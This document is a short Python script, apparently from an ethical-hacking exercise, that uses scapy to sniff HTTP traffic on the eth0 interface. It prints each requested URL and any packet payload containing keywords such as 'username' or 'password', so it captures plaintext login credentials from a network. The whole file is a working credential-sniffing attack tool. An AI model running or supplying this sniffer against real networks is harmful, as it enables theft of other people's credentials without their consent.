#!/usr/bin/env_python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "login", "email", "e-mail", "password", "pass"]
        for i in keywords:
            if i in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP request = " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\nPossible username/password is: " + login_info + "\n\n")


sniff("eth0")